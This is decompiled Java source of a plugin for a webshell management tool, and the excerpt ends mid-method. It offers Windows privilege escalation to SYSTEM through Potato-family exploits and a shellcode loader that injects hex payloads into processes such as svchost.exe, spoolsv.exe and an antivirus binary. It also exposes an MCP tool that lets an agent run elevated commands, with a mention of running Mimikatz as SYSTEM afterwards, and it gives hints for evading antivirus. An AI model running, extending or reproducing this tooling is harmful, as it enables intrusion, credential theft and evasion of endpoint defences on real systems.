//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.generic;

import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import com.intellij.uiDesigner.core.Spacer;
import com.kichik.pecoff4j.PE;
import com.kichik.pecoff4j.io.PEParser;
import core.EasyI18N;
import core.Encoding;
import core.annotation.McpParam;
import core.annotation.McpTool;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GFileChooser;
import core.ui.component.dialog.GOptionPane;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.Map;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.PrintStream;
import java.util.Locale;
import java.util.UUID;
import javax.swing.BorderFactory;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextField;
import javax.swing.SwingUtilities;
import javax.swing.border.Border;
import javax.swing.filechooser.FileNameExtensionFilter;
import javax.swing.JFileChooser;
import javax.swing.plaf.FontUIResource;
import javax.swing.text.StyleContext;
import org.fife.ui.rtextarea.RTextScrollPane;
import shells.plugins.PluginInfo;
import shells.plugins.generic.model.DotNetGenerateInfo;
import util.UiFunction;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;


public abstract class TH_TOOLS implements Plugin {
    public JPanel corePanel;
    private JTabbedPane tabbedPane1;
    private JTextField TextField_cmd;
    private JButton Execute_CmdButton;
    public RTextArea textArea_CmdResult;
    private JComboBox pluginComboBox;
    private JComboBox excuteFileComboBox;
    private JButton selectRawButton;
    private JButton scanProgramFilesButton;
    private JButton selectExePathButton;
    private JButton Execute_ShellcodeButton;
    public RTextArea TextArea_shellcode;
    public RTextArea TextArea_shellcodeResult;
    private RTextArea customPayloadArea;
    private JButton executeCustomPayloadButton;
    public ShellEntity shellEntity;
    public Payload payload;
    public Encoding encoding;
    public String CurrentPlugin;
    protected boolean loadState;
    public String Excute_cmd;
    PluginInfo[] pluginInfos;
    public String shellcodeHex;
    public static final String ENV_TH_TOOLS_ELEVATE_ENABLED = "TH_TOOLS_ELEVATE_ENABLED";
    public static final String ENV_TH_TOOLS_EXECUTE_FILE = "TH_TOOLS_EXECUTE_FILE";
    public static final String ENV_TH_TOOLS_POTATO_PLUGIN = "TH_TOOLS_POTATO_PLUGIN";
    private static final int PF_SCAN_MAX_DEPTH = 12;
    private static final int PF_SCAN_MAX_FILES = 5000;
    /** \u4e0e\u4e0b\u62c9\u6846\u7b2c\u4e00\u9879\u6587\u6848\u5fc5\u987b\u5b8c\u5168\u4e00\u81f4\uff08\u542b contains \u5224\u65ad\uff09 */
    private static final String PLUGIN_OPTION_NONE = "\u4e0d\u4f7f\u7528\u63d2\u4ef6 (\u76f4\u63a5\u6ce8\u5165)";

    private /* synthetic */ void $$$setupUI$$$() {
        JPanel jPanel = new JPanel();
        this.corePanel = jPanel;
        jPanel.setLayout(new GridLayoutManager(1, 1, new Insets(10, 10, 10, 10), -1, -1, false, false));
        JTabbedPane jTabbedPane = new JTabbedPane();
        this.tabbedPane1 = jTabbedPane;
        jTabbedPane.setEnabled(true);
        jPanel.add(jTabbedPane, new GridConstraints(0, 0, 1, 1, 0, 3, 3, 3, null, new Dimension(200, 200), null));
        jTabbedPane.setBorder(BorderFactory.createTitledBorder((Border) null, "Elevate", 0, 2, $$$getFont$$$(null, -1, -1, jTabbedPane.getFont()), (Color) null));
        JPanel jPanel2 = new JPanel();
        jPanel2.setLayout(new GridLayoutManager(2, 6, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("\u63d0\u6743\u547d\u4ee4", (Icon) null, jPanel2, (String) null);
        JLabel jLabel = new JLabel();
        jLabel.setText("\u63d2\u4ef6");
        jPanel2.add(jLabel, new GridConstraints(0, 0, 1, 1, 8, 0, 0, 0, null, null, null));
        JComboBox jComboBox2 = new JComboBox();
        this.pluginComboBox = jComboBox2;
        jPanel2.add(jComboBox2, new GridConstraints(0, 1, 1, 1, 8, 3, 2, 0, null, new Dimension(140, -1), null));
        JLabel jLabel0 = new JLabel();
        jLabel0.setText("\u547d\u4ee4");
        jPanel2.add(jLabel0, new GridConstraints(0, 2, 1, 1, 8, 0, 0, 0, null, null, null));
        JTextField jTextField = new JTextField();
        this.TextField_cmd = jTextField;
        jTextField.setText("whoami");
        jPanel2.add(jTextField, new GridConstraints(0, 3, 1, 2, 8, 1, 6, 0, null, new Dimension(260, -1), null));
        JButton jButton = new JButton();
        this.Execute_CmdButton = jButton;
        jButton.setText("\u6267\u884c");
        jPanel2.add(jButton, new GridConstraints(0, 5, 1, 1, 0, 1, 3, 0, null, null, null));
        RTextScrollPane rTextScrollPane = new RTextScrollPane();
        jPanel2.add(rTextScrollPane, new GridConstraints(1, 0, 1, 6, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea = new RTextArea();
        this.textArea_CmdResult = rTextArea;
        rTextArea.setText("\u5f53\u524d\u63d0\u6743\u6a21\u5757\u652f\u6301\u7684 Potato / \u5e38\u89c1 Shellcode \u5217\u8868\n\nPotato \u7cfb\u5217\uff1a\nEfsPotato / BadPotato / GodPotato / DeadPotato / SweetPotato / SigmaPotato / PrintNotifyPotato / McpManagementPotato\n\n\u4f7f\u7528\u987b\u77e5\n- McpManagementPotato \u9700 .NET 4.0\n- \u6267\u884c\u547d\u4ee4\u9ed8\u8ba4 whoami \u4ee5\u67e5\u770b\u6743\u9650\n");
        rTextScrollPane.setViewportView(rTextArea);
        JPanel jPanel3 = new JPanel();
        jPanel3.setLayout(new GridLayoutManager(5, 5, new Insets(0, 0, 0, 0), -1, -1, false, false));
        jTabbedPane.addTab("Shellcode \u52a0\u8f7d\u5668", (Icon) null, jPanel3, (String) null);
        JLabel jLabel2 = new JLabel();
        jLabel2.setText("\u6ce8\u5165\u8fdb\u7a0b");
        jPanel3.add(jLabel2, new GridConstraints(0, 0, 1, 1, 8, 0, 0, 0, null, null, null));
        JButton jButton2 = new JButton();
        this.Execute_ShellcodeButton = jButton2;
        jButton2.setText("\u6267\u884c");
        jButton2.setToolTipText("\u4f7f\u7528\u6240\u9009\u63d0\u6743\u63d2\u4ef6\uff08\u5982 GodPotato\uff09\u5411\u76ee\u6807\u8fdb\u7a0b\u6ce8\u5165 Shellcode\uff08SYSTEM \u6743\u9650\uff09");
        jPanel3.add(jButton2, new GridConstraints(0, 3, 1, 1, 0, 1, 3, 0, null, null, null));
        JButton jButton3 = new JButton();
        this.selectRawButton = jButton3;
        jButton3.setText("\u9009\u62e9 Raw");
        jPanel3.add(jButton3, new GridConstraints(0, 2, 1, 1, 0, 1, 3, 0, null, null, null));
        JComboBox jComboBox = new JComboBox();
        this.excuteFileComboBox = jComboBox;
        jPanel3.add(jComboBox, new GridConstraints(0, 1, 1, 1, 8, 3, 2, 0, null, null, null));
        jPanel3.add(new Spacer(), new GridConstraints(0, 4, 1, 1, 0, 1, 6, 1, null, null, null));
        JLabel jLabelPf = new JLabel();
        jLabelPf.setText("Program Files");
        jPanel3.add(jLabelPf, new GridConstraints(1, 0, 1, 1, 8, 0, 0, 0, null, null, null));
        JButton jBtnScanPf = new JButton();
        this.scanProgramFilesButton = jBtnScanPf;
        jBtnScanPf.setText("\u626b\u63cf Program Files");
        jBtnScanPf.setToolTipText("64\u4f4d JVM: C:\\\\Program Files  |  32\u4f4d JVM: C:\\\\Program Files (x86)\uff1b\u9012\u5f52\u6240\u6709 .exe\uff08\u8df3\u8fc7 node_modules \u7b49\u5de8\u76ee\u5f55\uff0c\u6700\u591a 5000 \u4e2a\uff09");
        jPanel3.add(jBtnScanPf, new GridConstraints(1, 1, 1, 1, 0, 1, 3, 0, null, null, null));
        JButton jBtnPickExe = new JButton();
        this.selectExePathButton = jBtnPickExe;
        jBtnPickExe.setText("\u6d4f\u89c8 exe...");
        jBtnPickExe.setToolTipText("\u624b\u52a8\u9009\u62e9\u76ee\u6807 .exe\uff08\u9ed8\u8ba4\u4ece\u5bf9\u5e94 Program Files\u8d77\u59cb\uff09");
        jPanel3.add(jBtnPickExe, new GridConstraints(1, 2, 1, 1, 0, 1, 3, 0, null, null, null));
        jPanel3.add(new Spacer(), new GridConstraints(1, 3, 1, 2, 0, 1, 6, 1, null, null, null));
        JSplitPane jSplitPane2 = new JSplitPane();
        jSplitPane2.setOrientation(0);
        jPanel3.add(jSplitPane2, new GridConstraints(2, 0, 1, 5, 0, 3, 3, 3, null, new Dimension(200, 200), null));
        RTextScrollPane rTextScrollPane2 = new RTextScrollPane();
        jSplitPane2.setLeftComponent(rTextScrollPane2);
        RTextArea rTextArea2 = new RTextArea();
        this.TextArea_shellcode = rTextArea2;
        rTextScrollPane2.setViewportView(rTextArea2);
        RTextScrollPane rTextScrollPane3 = new RTextScrollPane();
        jSplitPane2.setRightComponent(rTextScrollPane3);
        RTextArea rTextArea3 = new RTextArea();
        this.TextArea_shellcodeResult = rTextArea3;
        rTextScrollPane3.setViewportView(rTextArea3);
        JLabel jLabel3 = new JLabel();
        jLabel3.setText("\u81ea\u5b9a\u4e49 Payload(Hex)");
        jPanel3.add(jLabel3, new GridConstraints(3, 0, 1, 1, 8, 0, 0, 0, null, null, null));
        RTextScrollPane rTextScrollPane4 = new RTextScrollPane();
        jPanel3.add(rTextScrollPane4, new GridConstraints(3, 1, 1, 4, 0, 3, 3, 3, null, null, null));
        RTextArea rTextArea4 = new RTextArea();
        this.customPayloadArea = rTextArea4;
        rTextScrollPane4.setViewportView(rTextArea4);
        JButton jButton4 = new JButton();
        this.executeCustomPayloadButton = jButton4;
        jButton4.setText("\u6267\u884c\u81ea\u5b9a\u4e49 Payload");
        jButton4.setToolTipText("\u7ed3\u5408\u4e0a\u65b9\u6240\u9009\u63d2\u4ef6\uff1b\u82e5\u9009 GodPotato \u7b49\u5219\u63d0\u6743\u6ce8\u5165(SYSTEM)\uff1b\u9009\u300c\u4e0d\u4f7f\u7528\u63d2\u4ef6\u300d\u5219\u76f4\u63a5\u6ce8\u5165\uff08\u5f53\u524d\u6743\u9650\uff09");
        jPanel3.add(jButton4, new GridConstraints(4, 3, 1, 1, 0, 1, 3, 0, null, null, null));
        jPanel3.add(new Spacer(), new GridConstraints(4, 4, 1, 1, 0, 1, 6, 1, null, null, null));
    }

    public /* synthetic */ JComponent $$$getRootComponent$$$() {
        return this.corePanel;
    }

    private /* synthetic */ Font $$$getFont$$$(String str, int i, int i2, Font font) {
        String name;
        if (font == null) {
            return null;
        }
        if (str == null) {
            name = font.getName();
        } else {
            Font font2 = new Font(str, 0, 10);
            name = (font2.canDisplay('a') && font2.canDisplay('1')) ? str : font.getName();
        }
        Font font3 = new Font(name, i >= 0 ? i : font.getStyle(), i2 >= 0 ? i2 : font.getSize());
        Font font4 = System.getProperty("os.name", "").toLowerCase(Locale.ENGLISH).startsWith("mac") ? new Font(font3.getFamily(), font3.getStyle(), font3.getSize()) : new StyleContext().getFont(font3.getFamily(), font3.getStyle(), font3.getSize());
        return font4 instanceof FontUIResource ? font4 : new FontUIResource(font4);
    }

    public TH_TOOLS() {
        $$$setupUI$$$();
    }


    @McpTool(name = "exec", desc = "通过 TH_TOOLS 提权框架执行命令。提权成功后自动标记全局提权, 后续 Mimikatz 等工具将以 SYSTEM 上下文执行; 服务重启后标记失效需重新提权。插件: EfsPotato/BadPotato/GodPotato/SweetPotato/PrintNotifyPotato/McpManagementPotato", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "command", required = true, desc = "要执行的命令 (建议 cmd /c 前缀, 如: cmd /c whoami)"),
            @McpParam(name = "plugin", defaultValue = "EfsPotato", desc = "提权插件: EfsPotato/BadPotato/GodPotato/SweetPotato/PrintNotifyPotato/McpManagementPotato/不使用插件(直接注入)。不同系统成功率不同, 建议多试几个") })
    public String mcpExec(Map<String, Object> args) {
        String plugin = String.valueOf(args.getOrDefault("plugin", "EfsPotato"));
        String cmd = String.valueOf(args.get("command"));
        if (cmd == null || cmd.trim().isEmpty()) return "缺少参数: command";
        try {
            this.CurrentPlugin = plugin;
            if (!this.loadPlugin(this.CurrentPlugin)) return "插件加载失败: " + plugin;
            this.Excute_cmd = cmd;
            byte[] result = this.ExeCuteCmd();
            String resultString = this.encoding.Decoding(result);
            if (this.isElevateSuccess(resultString)) {
                this.markGlobalElevateEnabled();
                System.out.println("[TH_TOOLS] MCP 提权成功, 已标记全局提权");
            }
            return resultString;
        } catch (Exception e) {
            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
        }
    }

    public void init_plug() {
        this.excuteFileComboBox.addItem("C:\\Windows\\explorer.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\System32\\WerFault.exe");
        this.excuteFileComboBox.addItem("C:\\Program Files (x86)\\Huorong\\Sysdiag\\bin\\DB5Upgrade.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\System32\\svchost.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\System32\\services.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\System32\\spoolsv.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\System32\\rundll32.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\SysWOW64\\WerFault.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\SysWOW64\\svchost.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\SysWOW64\\services.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\SysWOW64\\spoolsv.exe");
        this.excuteFileComboBox.addItem("C:\\Windows\\SysWOW64\\rundll32.exe");
        this.excuteFileComboBox.addItem("C:\\Program Files\\Internet Explorer\\iexplore.exe");
        this.excuteFileComboBox.addItem("C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe");
        this.excuteFileComboBox.addItem("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
        this.excuteFileComboBox.addItem("C:\\Program Files\\Mozilla Firefox\\firefox.exe");
        this.excuteFileComboBox.addItem("C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE");
        this.excuteFileComboBox.setEditable(true);
        this.excuteFileComboBox.setSelectedIndex(1);
        this.pluginInfos = this.InitPlugInfo();
        this.pluginComboBox.removeAllItems();
        this.pluginComboBox.addItem(PLUGIN_OPTION_NONE); // Add default option
        PluginInfo[] var1 = this.pluginInfos;
        int var2 = var1.length;

        for(int var3 = 0; var3 < var2; ++var3) {
            PluginInfo s = var1[var3];
            this.pluginComboBox.addItem(s.getDisplayName());
        }

        this.pluginComboBox.setSelectedIndex(0);
        this.pluginComboBoxSelection((ActionEvent)null);
        this.pluginComboBox.addActionListener(this::pluginComboBoxSelection);
    }

    private void pluginComboBoxSelection(ActionEvent e) {
        Object selected = this.pluginComboBox.getSelectedItem();
        if (selected != null) {
            this.CurrentPlugin = selected.toString();
            this.tabbedPane1.setBorder(BorderFactory.createTitledBorder(this.CurrentPlugin));
        }
    }

    private void Execute_CmdButtonClick(ActionEvent actionEvent) {
        if (this.CurrentPlugin != null && !this.CurrentPlugin.isEmpty()) {
            if (!this.loadPlugin(this.CurrentPlugin)) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel), "\u63d2\u4ef6\u52a0\u8f7d\u5931\u8d25!");
            } else {
                this.Excute_cmd = this.TextField_cmd.getText().trim();
                byte[] result = this.ExeCuteCmd();
                String resultString = this.encoding.Decoding(result);
                this.textArea_CmdResult.setText(resultString);

                if (this.isElevateSuccess(resultString)) {
                    this.textArea_CmdResult.append("\n\n[DEBUG] \u6743\u9650\u68c0\u6d4b: \u6210\u529f\u8bc6\u522b SYSTEM \u6743\u9650");
                    boolean alreadyEnabled = isGlobalElevateEnabled(this.shellEntity);
                    this.textArea_CmdResult.append("\n[DEBUG] \u9996\u6b21\u63d0\u793a\u72b6\u6001: " + (alreadyEnabled ? "\u5df2\u5f00\u542f(\u672c\u6b21\u4e0d\u518d\u5f39\u7a97)" : "\u51c6\u5907\u5f39\u7a97"));

                    this.markGlobalElevateEnabled();
                    if (!alreadyEnabled) {
                        showElevateSuccessDialog();
                    }
                } else {
                     String upper = resultString != null ? resultString.toUpperCase(Locale.ENGLISH) : "";
                     if (upper.contains("SYSTEM")) {
                         this.textArea_CmdResult.append("\n\n[DEBUG] \u6743\u9650\u68c0\u6d4b: \u542b\u6709 'SYSTEM' \u5173\u952e\u5b57\uff0c\u4f46\u672a\u5339\u914d\u5b8c\u6574\u683c\u5f0f(NT AUTHORITY\\SYSTEM \u7b49)\u3002");
                     }
                }
            }

        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel), "\u672a\u9009\u62e9\u6709\u6548\u63d2\u4ef6!");
        }
    }

    private void Execute_ShellcodeButtonClick(ActionEvent actionEvent) {
        if (this.CurrentPlugin != null && !this.CurrentPlugin.isEmpty()) {
            if (!this.loadPlugin(this.CurrentPlugin)) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel), "\u63d2\u4ef6\u52a0\u8f7d\u5931\u8d25!");
            } else {
                this.Excute_cmd = this.excuteFileComboBox.getSelectedItem().toString();
                byte[] result = this.ExeCuteShellcode();
                String resultString = this.encoding.Decoding(result);
                this.TextArea_shellcodeResult.setText(resultString);
                if (this.isElevateSuccess(resultString)) {
                    boolean alreadyEnabled = isGlobalElevateEnabled(this.shellEntity);
                    this.markGlobalElevateEnabled();
                    if (!alreadyEnabled) {
                        showElevateSuccessDialog();
                    }
                }
            }

        } else {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel), "\u672a\u9009\u62e9\u6709\u6548\u63d2\u4ef6!");
        }
    }

    /**
     * JVM 64 \u4f4d\u4f18\u5148 {@code C:\\Program Files}\uff0c32 \u4f4d\u4f18\u5148 {@code C:\\Program Files (x86)}\uff1b
     * \u76ee\u5f55\u4e0d\u5b58\u5728\u65f6\u56de\u9000\u53e6\u4e00\u4e2a\u3002
     */
    public static String getDefaultProgramFilesRoot() {
        boolean jvm64 = "64".equals(System.getProperty("sun.arch.data.model"));
        File pf = new File("C:\\Program Files");
        File pf86 = new File("C:\\Program Files (x86)");
        if (jvm64) {
            if (pf.isDirectory()) {
                return "C:\\Program Files";
            }
            if (pf86.isDirectory()) {
                return "C:\\Program Files (x86)";
            }
        } else {
            if (pf86.isDirectory()) {
                return "C:\\Program Files (x86)";
            }
            if (pf.isDirectory()) {
                return "C:\\Program Files";
            }
        }
        return pf.isDirectory() ? "C:\\Program Files" : "C:\\Program Files (x86)";
    }

    private static boolean shouldSkipScanDir(String absPathLower) {
        return absPathLower.contains("\\node_modules\\")
            || absPathLower.contains("\\.git\\")
            || absPathLower.contains("\\windowsapps\\")
            || absPathLower.contains("\\nuget\\packages\\")
            || absPathLower.contains("\\__pycache__\\")
            || absPathLower.contains("\\.nuget\\");
    }

    private static void collectProgramFilesExes(File dir, int depthLeft, Set<String> seen, List<String> out) {
        if (depthLeft < 0 || out.size() >= PF_SCAN_MAX_FILES || dir == null || !dir.isDirectory()) {
            return;
        }
        String low = dir.getAbsolutePath().toLowerCase(Locale.ROOT);
        if (shouldSkipScanDir(low + "\\")) {
            return;
        }
        File[] children = dir.listFiles();
        if (children == null) {
            return;
        }
        for (File c : children) {
            if (out.size() >= PF_SCAN_MAX_FILES) {
                return;
            }
            if (c.isDirectory()) {
                collectProgramFilesExes(c, depthLeft - 1, seen, out);
            } else if (c.isFile() && c.getName().toLowerCase(Locale.ROOT).endsWith(".exe")) {
                String ap = c.getAbsolutePath();
                if (seen.add(ap)) {
                    out.add(ap);
                }
            }
        }
    }

    private void scanProgramFilesButtonClick(ActionEvent actionEvent) {
        if (!System.getProperty("os.name", "").toLowerCase(Locale.ENGLISH).contains("win")) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel),
                "\u4ec5\u5728 Windows \u4e0b\u652f\u6301\u626b\u63cf Program Files\u3002",
                "\u63d0\u793a", 2);
            return;
        }
        final String rootPath = getDefaultProgramFilesRoot();
        final File root = new File(rootPath);
        if (!root.isDirectory()) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel),
                "\u76ee\u5f55\u4e0d\u5b58\u5728: " + rootPath,
                "\u9519\u8bef", 0);
            return;
        }
        this.scanProgramFilesButton.setEnabled(false);
        new Thread(() -> {
            List<String> found = new ArrayList<>();
            Set<String> seen = new HashSet<>();
            collectProgramFilesExes(root, PF_SCAN_MAX_DEPTH, seen, found);
            Collections.sort(found, String.CASE_INSENSITIVE_ORDER);
            SwingUtilities.invokeLater(() -> {
                this.scanProgramFilesButton.setEnabled(true);
                javax.swing.ComboBoxModel<?> model = this.excuteFileComboBox.getModel();
                Set<String> existing = new HashSet<>();
                for (int i = 0; i < model.getSize(); i++) {
                    Object o = model.getElementAt(i);
                    if (o != null) {
                        existing.add(o.toString());
                    }
                }
                int added = 0;
                for (String p : found) {
                    if (existing.add(p)) {
                        this.excuteFileComboBox.addItem(p);
                        added++;
                    }
                }
                if (!found.isEmpty()) {
                    this.excuteFileComboBox.setSelectedItem(found.get(0));
                }
                String tail = found.size() >= PF_SCAN_MAX_FILES
                    ? "\n\uff08\u5df2\u8fbe\u4e0a\u9650 " + PF_SCAN_MAX_FILES + " \u4e2a\uff0c\u53ef\u7528\u300c\u6d4f\u89c8 exe\u300d\u8865\u5145\uff09"
                    : "";
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel),
                    "\u6839\u76ee\u5f55: " + rootPath + "\n\u672c\u6b21\u65b0\u589e: " + added + " \u4e2a .exe\uff08\u5df2\u53bb\u91cd\uff09" + tail,
                    "\u626b\u63cf\u5b8c\u6210", 1);
            });
        }, "TH_TOOLS-scan-ProgramFiles").start();
    }

    private void selectExePathButtonClick(ActionEvent actionEvent) {
        JFileChooser fc = new JFileChooser();
        fc.setDialogTitle("\u9009\u62e9\u76ee\u6807 .exe");
        fc.setFileSelectionMode(JFileChooser.FILES_ONLY);
        fc.setFileFilter(new FileNameExtensionFilter("Executable (*.exe)", "exe"));
        File start = new File(getDefaultProgramFilesRoot());
        if (start.isDirectory()) {
            fc.setCurrentDirectory(start);
        }
        int r = fc.showOpenDialog(this.corePanel);
        if (r == JFileChooser.APPROVE_OPTION && fc.getSelectedFile() != null) {
            String path = fc.getSelectedFile().getAbsolutePath();
            boolean dup = false;
            javax.swing.ComboBoxModel<?> model = this.excuteFileComboBox.getModel();
            for (int i = 0; i < model.getSize(); i++) {
                Object o = model.getElementAt(i);
                if (o != null && path.equalsIgnoreCase(o.toString())) {
                    dup = true;
                    this.excuteFileComboBox.setSelectedIndex(i);
                    break;
                }
            }
            if (!dup) {
                this.excuteFileComboBox.insertItemAt(path, 0);
                this.excuteFileComboBox.setSelectedIndex(0);
            }
        }
    }

    private void selectRawButtonClick(ActionEvent actionEvent) {
        GFileChooser fileChooser = new GFileChooser();
        fileChooser.setTitle("\u9009\u62e9\u6587\u4ef6");
        File selectdFile = fileChooser.showOpenDialog(this.corePanel);
        if (selectdFile != null) {
            try {
                byte[] fileBytes = functions.readInputStreamAutoClose(new FileInputStream(selectdFile));
                this.shellcodeHex = functions.byteArrayToHex(fileBytes);
                this.TextArea_shellcode.setText(selectdFile.getAbsolutePath());
            } catch (Exception var5) {
                GOptionPane.showMessageDialog(this.corePanel, var5.getMessage(), "\u9519\u8bef", 2);
            }
        }

    }

    private void executeCustomPayloadButtonClick(ActionEvent actionEvent) {
        String input = this.customPayloadArea.getText();
        if (input == null || input.trim().isEmpty()) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel), "\u8bf7\u586b\u5165 Payload(Hex)\u5185\u5bb9!");
        } else {
            String payloadHex = input.replaceAll("[^0-9a-fA-F]", "");
            if ((payloadHex.length() & 1) == 1) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.corePanel), "Hex \u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u4e3a\u5076\u6570!");
            } else {
                try {
                    byte[] payloadBytes = functions.hexToByte(payloadHex);
                    byte[] result;

                    this.shellcodeHex = payloadHex;
                    this.Excute_cmd = this.excuteFileComboBox.getSelectedItem().toString();

                    boolean usePlugin = this.CurrentPlugin != null
                                     && !this.CurrentPlugin.isEmpty()
                                     && !PLUGIN_OPTION_NONE.equals(this.CurrentPlugin);

                    this.TextArea_shellcodeResult.append(String.format("\n[INFO] Payload \u5927\u5c0f: %d bytes", payloadBytes.length));
                    this.TextArea_shellcodeResult.append(String.format("\n[INFO] \u6ce8\u5165\u76ee\u6807: %s", this.Excute_cmd));

                    if (this.Excute_cmd.toLowerCase().contains("werfault.exe") && usePlugin) {
                        this.TextArea_shellcodeResult.append("\n[WARN] \u6ce8\u610f: WerFault.exe \u53ef\u80fd\u5728\u63d2\u4ef6\u542f\u52a8\u540e\u5f88\u5feb\u9000\u51fa\u3002");
                        this.TextArea_shellcodeResult.append("\n[WARN] \u5efa\u8bae\u6539\u4e3a notepad.exe \u6216 spoolsv.exe \u4ee5\u786e\u4fdd Shellcode \u6709\u8db3\u591f\u8fd0\u884c\u65f6\u95f4\u3002");
                    }

                    if (usePlugin && this.loadPlugin(this.CurrentPlugin)) {
                        try {
                            byte[] shellcode = this.getPayloadAsShellcode(payloadBytes, "");

                            String tempFilePath = String.format("C:\\Users\\Public\\%s.tmp", UUID.randomUUID().toString());
                            String shellcodeB64 = functions.base64EncodeToString(shellcode);
                            boolean uploadSuccess = false;

                            try {
                                this.TextArea_shellcodeResult.append(String.format("\n[INFO] \u6b63\u5728\u4e0a\u4f20 Shellcode \u5230\u4e34\u65f6\u6587\u4ef6: %s", tempFilePath));
                                uploadSuccess = this.payload.uploadFile(tempFilePath, shellcodeB64.getBytes());
                            } catch (Exception e) {
                                this.TextArea_shellcodeResult.append("\n[ERROR] \u4e0a\u4f20\u5931\u8d25: " + e.getMessage());
                            }

                            if (uploadSuccess) {
                                try {
                                    String args = functions.base64EncodeToString(this.Excute_cmd.getBytes()) + " " + functions.base64EncodeToString(tempFilePath.getBytes());

                                    this.TextArea_shellcodeResult.append(String.format("\n[INFO] \u6b63\u4f7f\u7528 %s \u8fdb\u884c\u63d0\u6743\u5e76\u6ce8\u5165\u81ea\u5b9a\u4e49 Payload...", this.CurrentPlugin));
                                    result = this.runNetPe(args, this.getPluginByte(), 7000, this.TextArea_shellcodeResult.getPrintStream());
                                } finally {
                                    this.payload.deleteFile(tempFilePath);
                                    this.TextArea_shellcodeResult.append("\n[INFO] \u5df2\u5220\u9664\u4e34\u65f6\u6587\u4ef6\u3002");
                                }
                            } else {
                                this.TextArea_shellcodeResult.append("\n[WARN] \u4e34\u65f6\u6587\u4ef6\u4e0a\u4f20\u5931\u8d25\uff0c\u6539\u7528\u5185\u8054 Shellcode\uff08\u53ef\u80fd\u4e0d\u7a33\u5b9a\uff09...");
                                String args = functions.base64EncodeToString(this.Excute_cmd.getBytes()) + " " + shellcodeB64;
                                result = this.runNetPe(args, this.getPluginByte(), 7000, this.TextArea_shellcodeResult.getPrintStream());
                            }
                        } catch (UnsupportedOperationException e) {
                             if (e.getMessage().contains("\u975e .NET \u7a0b\u5e8f\u96c6")) {
                                 throw new Exception("\u63d0\u6743\u6a21\u5f0f\u4e0d\u652f\u6301\u539f\u751f PE\uff0c\u8bf7\u6362\u7528 Shellcode \u6216 .NET \u7a0b\u5e8f\u96c6\u3002");
                             }
                             throw e;
                        }
                    } else {
                        if (usePlugin) {
                             this.TextArea_shellcodeResult.append("\n[WARN] \u63d2\u4ef6\u52a0\u8f7d\u5931\u8d25\u6216\u65e0\u6548\uff0c\u964d\u7ea7\u4e3a\u76f4\u63a5\u6ce8\u5165\u6a21\u5f0f...");
                        } else {
                             this.TextArea_shellcodeResult.append("\n[INFO] \u76f4\u63a5\u6ce8\u5165\u6a21\u5f0f\uff08\u672a\u4f7f\u7528\u63d0\u6743\u63d2\u4ef6\uff09...");
                        }
                        result = this.runShellcode(this.Excute_cmd, payloadBytes, 7000);
                    }

                    String resultString = this.encoding.Decoding(result);
                    this.TextArea_shellcodeResult.append("\n\n====== \u6267\u884c\u7ed3\u679c ======\n");
                    if (resultString != null && !resultString.isEmpty()) {
                        this.TextArea_shellcodeResult.append(resultString);
                        if (resultString.trim().equalsIgnoreCase("ok") && usePlugin) {
                            this.TextArea_shellcodeResult.append("\n\n[HINT] \u63d0\u793a: \u4ec5\u8fd4\u56de 'ok' \u65f6 Shellcode \u53ef\u80fd\u672a\u5e94\u7528\u3002");
                            this.TextArea_shellcodeResult.append("\n1. \u5c1d\u8bd5\u5176\u4ed6\u63d0\u6743\u63d2\u4ef6 (\u5982 BadPotato/SweetPotato)");
                            this.TextArea_shellcodeResult.append("\n2. \u6216\u4f7f\u7528\u300c\u4e0d\u4f7f\u7528\u63d2\u4ef6\u300d\u6a21\u5f0f\u76f4\u63a5\u8fd0\u884c\u5e76\u6392\u67e5");
                            this.TextArea_shellcodeResult.append("\n3. \u786e\u8ba4\u6ce8\u5165\u76ee\u6807 (\u5982 notepad.exe) \u672a\u88ab\u6740\u8f6f\u62e6\u622a");
                        }
                    } else {
                        this.TextArea_shellcodeResult.append("(Shellcode \u5df2\u63d0\u4ea4\uff0c\u65e0\u6587\u672c\u8f93\u51fa)");
                    }
                     this.TextArea_shellcodeResult.append("\n======================\n");

                     if (this.isElevateSuccess(resultString)) {
